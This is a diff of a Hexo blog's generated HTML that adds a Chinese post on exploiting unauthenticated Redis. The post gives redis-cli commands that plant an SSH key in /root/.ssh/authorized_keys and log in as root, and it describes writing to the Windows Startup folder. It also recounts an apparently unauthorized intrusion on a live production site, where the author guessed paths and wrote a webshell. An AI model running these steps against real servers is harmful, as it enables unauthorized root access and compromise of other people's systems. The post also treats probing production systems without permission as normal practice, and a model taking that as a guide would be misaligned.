@@ -19,18 +19,30 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/2/index.html">
+    <meta name="description" content="0x00 前言最近终于挖到个有点意思的漏洞，比之前卵用没有的信息泄露好点。可惜因为是Windows Server，最后没搞到shell，不过也学到点东西吧。 Redis是最流行的非关系型即key-value数据库，通常用来做缓存。我之前写Java Web的时候，存储身份信息用的session和cookie，但据说用redis做token也可以。此外，如果查询数据量大，或者对并发要求高，也需要用re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis未授权访问原理及利用">
+<meta property="og:url" content="http://example.com/2023/07/07/The-exp-of-Redis-unauthorized/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言最近终于挖到个有点意思的漏洞，比之前卵用没有的信息泄露好点。可惜因为是Windows Server，最后没搞到shell，不过也学到点东西吧。 Redis是最流行的非关系型即key-value数据库，通常用来做缓存。我之前写Java Web的时候，存储身份信息用的session和cookie，但据说用redis做token也可以。此外，如果查询数据量大，或者对并发要求高，也需要用re">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCcAaZD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCc13Jf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCctKeg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCctNOU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCct6l6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/07/07/pCctTpt.png">
+<meta property="article:published_time" content="2023-07-07T02:51:45.000Z">
+<meta property="article:modified_time" content="2023-07-07T08:35:08.666Z">
 <meta property="article:author" content="Kizurena">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2023/07/07/pCcAaZD.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>Kizureina&#39;s Blog</title>
+    <title>Redis未授权访问原理及利用 · Kizureina&#39;s Blog</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -217,10 +229,10 @@
         }
     </script>
     
-        <body class="home-body">
+        <body class="post-body">
     
         <!-- header -->
-        <header class="header header-mobile index-header">
+        <header class="header header-mobile">
     <!-- top read progress line -->
     <div class="header-element">
         <div class="read-progress"></div>
@@ -248,10 +260,21 @@
     </div>
     <!-- toggle banner for post layout -->
     
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">Kizureina&#39;s Blog</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">Redis未授权访问原理及利用</a>
+            </div>
+        </div>
+    
 </header>
 
         <!-- fixed footer -->
-        <footer class="footer-fixed index-footer-fixed">
+        <footer class="footer-fixed">
     <!-- back to top button -->
     <div class="footer-fixed-element">
         
@@ -281,17 +304,17 @@
     <!-- 主页  -->
     
         
-    <!-- 文章页  -->
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/index-bg.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                Kizureina's Blog
-            <!-- 文章页  -->
+                Redis未授权访问原理及利用
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
@@ -299,12 +322,54 @@
             <!-- 主页副标题  -->
             
                 
-                    I know nothing except the fact of my ignorance.
-                
-            <!-- 文章页  -->
+            <!-- 404 -->
             
         </p>
         <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">1.9k</span>Reading time: <span class="post-count reading-time">6 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/07/07</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -434,460 +499,156 @@
 
             <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
             <div class="container container-unloaded">
-                <main class="main index-page">
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/12/20/log4j-RCE/">
-                
-                <span class="abstract-title-text">Log4j2 RCE漏洞复现</span>
-            </a>
-            <div class="abstract-content">
-                0x00 引言Log4j2 RCE恐怕是近几年最严重也影响最广的漏洞，log4j2作为最流行的Java开源日志框架之一，应用极广，而该RCE又非常容易被利用，因此非常危险。去年这个时候拜他所赐相当热闹，实际上复现不算困难，本文从头开始...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/12/25">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/12/20</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="RCE">RCE</a>
-    
-</div>
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近终于挖到个有点意思的漏洞，比之前卵用没有的信息泄露好点。可惜因为是Windows Server，最后没搞到shell，不过也学到点东西吧。</p>
+<p>Redis是最流行的非关系型即key-value数据库，通常用来做缓存。我之前写Java Web的时候，存储身份信息用的session和cookie，但据说用redis做token也可以。此外，如果查询数据量大，或者对并发要求高，也需要用redis做消息队列。</p>
+<p>说起来比较有意思的是，我最早在面试安全社团的时候就遇到过redis未授权，但直到今天才搞明白。</p>
+<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>言归正传，导致漏洞的原因很简单：</p>
+<blockquote>
+<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行<strong>写文件操作</strong>，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+</blockquote>
+<p>总结起来，产生条件有两点：</p>
+<ol>
+<li><p>redis监听在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网。</p>
+</li>
+<li><p>未设置登陆密码</p>
+</li>
+<li><p>(可选)redis以root权限运行</p>
+</li>
+</ol>
+<p>产生危害：</p>
+<blockquote>
+<p>Under certain conditions, if Redis runs with the root account (or not even), attackers can write an SSH public key file to the root account, directly logging on to the victim server through SSH. This may allow hackers to gain server privileges, delete or steal data, or even lead to an encryption extortion, critically endangering normal business services.</p>
+</blockquote>
+<p>总之，如何存在redis未授权，有很大可能getshell，尤其在Linux下。</p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="1-Linux写入SSH密钥getshell"><a href="#1-Linux写入SSH密钥getshell" class="headerlink" title="1. Linux写入SSH密钥getshell"></a>1. Linux写入SSH密钥getshell</h4><p>SSH连接需要配置公钥私钥，这种配置也可以用来做免密SFTP文件传输，主要流程：</p>
+<blockquote>
+<p>1、客户端生成RSA公钥和私钥</p>
+<p>2、客户端将自己的公钥存放到服务器</p>
+<p>3、客户端请求连接服务器，服务器将一个随机字符串发送给客户端</p>
+<p>4、客户端根据自己的私钥加密这个随机字符串之后再发送给服务器</p>
+<p>5、服务器接受到加密后的字符串之后用公钥解密，如果正确就让客户端登录，否则拒绝。这样就不用使用密码了。</p>
+</blockquote>
+<p>生成密钥需要用Linux下的ssh-keygen命令，Windows下用git bash也可以直接用，生成RSA公钥私钥对：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/12/08/from-0-to-1-EE-Learning-Note/">
-                
-                <span class="abstract-title-text">从零开始的电子学习之路</span>
-            </a>
-            <div class="abstract-content">
-                前言对于0并无正负之分，之前我都对电子一无所知，因此也谈不上感兴趣与否。自这学期的电分模电开始才第一次对EE有了印象，感觉还蛮有意思。
-十月份某日，Java老师提到他的网站是跑在作为服务器的树莓派上的，说者无心听者有意，我那时不知道脑...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/12/22">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/12/08</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="嵌入式">嵌入式</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="硬件">硬件</a>
-    
-</div>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCcAaZD"><img src="https://s1.ax1x.com/2023/07/07/pCcAaZD.png" alt="pCcAaZD.png"></a></p>
+<p>然后就是redis未授权的利用了，上面的描述可以看出来，这个漏洞的实质就是<strong>通过redis提供的数据库持久化命令写文件</strong>。因此将生成的公钥写入服务器，就能使用SSH连接getshell了。</p>
+<p>先将生成公钥文件上传到redis数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> id_rsa.pub | redis-cli -h 192.168.1.16 -p 6379 -x <span class="built_in">set</span> crack</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/11/18/Java-web-file-manger-cloud-online/">
-                
-                <span class="abstract-title-text">基于JavaWeb的文件管理系统+OrangePi+内网穿透实现不限速大容量网盘</span>
-            </a>
-            <div class="abstract-content">
-                0x00 前言今年四月某日，我正写完大部分python qqbot插件，为该做什么发愁。刚好那时有社团展示，我百无聊赖在银杏大道散步闲逛时遇到了一个有趣的web开发向实验室。和摆摊的学长聊天之后，我才发现之前自己写的插件实际上就是we...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/12/11">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/11/18</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-</div>
+<p>这行命令实际上是先用cat打印出文件中数据，然后利用管道符将数据重定向至redis-cli，并作为-x即设置key-value值的参数，<strong>在数据库中插入key为crack，value为公钥文件数据的一行记录</strong>：</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCc13Jf"><img src="https://s1.ax1x.com/2023/07/07/pCc13Jf.png" alt="pCc13Jf.png"></a></p>
+<p>此时数据插入数据库，但只是在内存中，接下来<strong>需要使用redis持久化命令写入文件</strong>。</p>
+<p>然后使用redis-cli连接redis数据库进入redis命令行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.16 -p 6379</span><br><span class="line">192.168.1.16:6379&gt;config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/11/09/hello-world/">
-                
-                <span class="abstract-title-text">Hello World——My first Hexo Blog</span>
-            </a>
-            <div class="abstract-content">
-                Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using ...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/09">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/11/09</span>
-                </div>
-                <!-- tags -->
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/09/28/Java-Web-learning-Note/">
-                
-                <span class="abstract-title-text">Java Web学习笔记v3</span>
-            </a>
-            <div class="abstract-content">
-                Java WebJDBC
-JDBC驱动连接Mysql数据库8.0MySQL 8.0 以上版本的数据库连接有所不同：
+<p>此时切换环境变量<em><strong>dir</strong></em>(即数据库所在根目录)，设置为root密钥目录。</p>
+<blockquote>
+<p>此外，这里切换目录时，如果目录不存在会报错，我感觉这里可以用目录扫描+redis的INFO命令中的redis根路径来猜出实际目录结构。</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.16:6379&gt;config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
 
-1、MySQL 8.0 以上版本驱动包版本 mysql-connector-java-8.0.16.jar。
-2、*...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/15">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/09/28</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="web">web</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="JavaScript">JavaScript</a>
-    
-</div>
+<p>这里需要<strong>权限</strong>，我试了下自己装的docker里redis使用这条命令会报错dir是protected变量，不能修改。</p>
+<p>然后修改环境变量数据库持久化文件名<em><strong>dbfilename</strong></em>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.16:6379&gt;config <span class="built_in">set</span> filename authorized_keys</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/09/08/Java-learning-Note-v-3/">
-                
-                <span class="abstract-title-text">Java学习笔记</span>
-            </a>
-            <div class="abstract-content">
-                Java leraning Note v.3多线程创建线程
+<p>authorized_keys是SSH连接允许的公钥列表文件的默认文件名。</p>
+<blockquote>
+<p>这里我也想到一点东西，如果当前数据库目录下已经存在同名文件会怎么样？应该是覆盖</p>
+</blockquote>
+<p>最后保存即可连接成功：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.16:6379&gt;save</span><br><span class="line">OK</span><br><span class="line">ssh -i id_rsa root@192.168.1.16</span><br><span class="line">root@192.168.1.16<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 
-123456789101112131415161718public class threadDemo &#123;    public static void main(S...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/15">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/09/08</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-</div>
+<p>当然还有很多其他操作，<strong>crontab计划任务反弹shell</strong>也是有意思的思路，其他详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/121912003">参考</a>。</p>
+<h4 id="2-Windows写入自启动目录"><a href="#2-Windows写入自启动目录" class="headerlink" title="2. Windows写入自启动目录"></a>2. Windows写入自启动目录</h4><p>上面的办法简单高效，但只适用于与Linux，如果是Windows server怎么办呢？</p>
+<p>上面参考链接的crontab反弹shell给了一个思路，就是<strong>利用启动项</strong>。</p>
+<p>和Linux不太相同，Windows的自启动有几类：系统服务、计划任务、注册表启动项、用户的startup目录。其中前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用。</p>
+<p>startup的绝对路径如下：</p>
+<p><code>C:\Users\[username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
+<p>虽然想知道用户名并不容易，但把常用的用户名挨个跑一遍，万一就成功了呢？<em>八成是Administrator</em></p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCctKeg"><img src="https://s1.ax1x.com/2023/07/07/pCctKeg.png" alt="pCctKeg.png"></a></p>
+<p>然后等待服务器重启即可（虽然还是只能等，而且要赌一把服务器会重启）。</p>
+<h2 id="0x03-实际渗透"><a href="#0x03-实际渗透" class="headerlink" title="0x03 实际渗透"></a>0x03 实际渗透</h2><p>这次扫信息发布网，终于碰到了Redis未授权:</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCctNOU"><img src="https://s1.ax1x.com/2023/07/07/pCctNOU.png" alt="pCctNOU.png"></a></p>
+<p>所以很容易就连上了Redis数据库，用INFO命令得到一些信息，但有用的只有config_file:</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCct6l6"><img src="https://s1.ax1x.com/2023/07/07/pCct6l6.png" alt="pCct6l6.png"></a></p>
+<p>当然此时就可以随便对数据库增删改查了，果然是非常非常危险的漏洞。但很可惜是Windows server的服务器，所以大部分getshell的操作都用不来。</p>
+<p>不过在对服务器仔细看了下，我发现用到了nginx中间件，那么能不能写入webshell呢？听起来有点搞头。</p>
+<p>写webshell需要两个条件：</p>
+<ol>
+<li><p>知道nginx静态文件目录的路径</p>
+</li>
+<li><p>知道这些文件对应的URL，并且能够正常访问</p>
+</li>
+</ol>
+<p>老实说，两个都不容易达到。但第一个可以通过config_file的路径猜下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pCctTpt"><img src="https://s1.ax1x.com/2023/07/07/pCctTpt.png" alt="pCctTpt.png"></a></p>
+<p>居然很容易就猜出来了！然后写入webshell一句话木马当然也没什么难度了。</p>
+<p>这里我其实想到可以写一个类似于disearch这种目录扫描工具做实际路径猜测，路径是否存在回显非常明显嘛。</p>
+<p>可惜麻烦的是第二步，扫了半天目录又猜了半天，还是没办法对应起来，主要是没见过这种比较复杂的静态网站的nginx目录结构。</p>
+<p>但是猜到了<code>/nginx/conf</code>的路径，有没有可能用ngnix.conf覆盖本来的配置呢？我感觉这也是一种有意思的思路，可惜是生产环境没办法测试。</p>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
+    </article>
+    <!-- license -->
     
-        
-        
-        
-        
+        <div class="license-wrapper">
+            <p>Author：<a href="http://example.com">Kizurena</a>
+            <p>Link：<a href="http://example.com/2023/07/07/The-exp-of-Redis-unauthorized/">http://example.com/2023/07/07/The-exp-of-Redis-unauthorized/</a>
+            <p>Publish date：<a href="http://example.com/2023/07/07/The-exp-of-Redis-unauthorized/">July 7th 2023, 10:51:45 am</a>
+            <p>Update date：<a href="http://example.com/2023/07/07/The-exp-of-Redis-unauthorized/">July 7th 2023, 4:35:08 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/06/17/Java-learning-Note-v-2/">
-                
-                <span class="abstract-title-text">Java学习笔记v2</span>
-            </a>
-            <div class="abstract-content">
-                Java learning Note v.2集合嵌套在Map集合中再放List集合：
-123456789101112131415161718192021222324252627package com.D2;import java.ut...
-            </div>
-            <!-- read more -->
+        </li>
+        <li class="previous">
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/15">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/06/17</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/06/05/Start-of-Java-Sec-command-execute-and-reflection/" title="Java安全入门：命令执行，反射与反序列化">
+                    <div class="prevTitle">Java安全入门：命令执行，反射与反序列化</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
     
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-</div>
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
-            
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/04/14/Note%20of%20Java%20Learning/">
-                
-                <span class="abstract-title-text">Java学习笔记v1</span>
-            </a>
-            <div class="abstract-content">
-                Note of Java LearningJava 语法基础引用Java中有引用的概念，类似于C语言的指针。
-例如改变指向数组指针（引用数组）的值：
 
-数组也好，字符串通过地址引用也好，都与指针如出一辙嘛。
-for each12345...
-            </div>
-            <!-- read more -->
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/15">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/04/14</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/03/01/javascript-report-in-bili/">
-                
-                <span class="abstract-title-text">简单的JS插件编写——检索Bilibili评论并举办</span>
-            </a>
-            <div class="abstract-content">
-                前言最近刚开学比较闲，想写个简单的js插件练练手，刚好看某些评论区低能评论太多，举办侠又有限，就想写个脚本匹配关键字批量举办
-基本思路通过B站页面的INITAL_STATE方法获取视频av号，再通过Ajax对api接口发起请求获取评论...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/12">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/03/01</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="JavaScript">JavaScript</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/2022/02/14/ssti-quick-start/">
-                
-                <span class="abstract-title-text">SSTI——flask模板注入漏洞入门</span>
-            </a>
-            <div class="abstract-content">
-                最近一直在和python打交道，就想顺便学点Flask漏洞，也算打打python后端框架基础吧。
-Flask搭建后端服务众所周知python也可用用来写后端，最简单的框架就是Flask，例如:
-12345678910from flas...
-            </div>
-            <!-- read more -->
-            
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2022/11/12">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2022/02/14</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="python">python</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="SSTI">SSTI</a>
-    
-</div>
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
     
-    <!-- paginator  -->
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
     
-        <nav class="page-nav">
-            <a class="extend prev" rel="prev" href="/">&lt; PREV</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">NEXT &gt;</a>
-        </nav>
+    <!-- Mathjax -->
     
 </main>
 
                 <!-- profile -->
-                
-                    <div class="profile">
-    <img class="profile-avatar" alt="avatar" src= /avatar/saber.png />
-    <div class="profile-name">Kizureina</div>
-    
-        <div class="profile-signature">
-            witness me
-        </div>
-    
-    
-        <div class="profile-social">
-            
-    
-        
-            
-                <a href="mailto:tsukinomito@mailfence.com" class="iconfont-archer email" title=email ></a>
-            
-        
-    
-        
-            
-                <a href="//github.com/Kizureina" class="iconfont-archer github" target="_blank" title=github></a>
-            
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-
-
-        </div>
-    
-    
-    
-        <div class="profile-link-item">
-            <a href="/about" class="about-me">
-                
-                ABOUT ME
-            </a>
-        </div>
-    
-    
-    
-</div>
-
                 
             </div>
             <footer class="footer footer-unloaded">
@@ -963,6 +724,23 @@ Flask搭建后端服务众所周知python也可用用来写后端，最简单的
 
         </div>
         <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Linux%E5%86%99%E5%85%A5SSH%E5%AF%86%E9%92%A5getshell"><span class="toc-number">3.0.1.</span> <span class="toc-text">1. Linux写入SSH密钥getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Windows%E5%86%99%E5%85%A5%E8%87%AA%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95"><span class="toc-number">3.0.2.</span> <span class="toc-text">2. Windows写入自启动目录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%AE%9E%E9%99%85%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">0x03 实际渗透</span></a></li></ol>
+            </div>
         
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -1570,6 +1348,8 @@ Flask搭建后端服务众所周知python也可用用来写后端，最简单的
         <!-- CNZZ -->
         
         <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
         
         <!-- mermaid -->
         
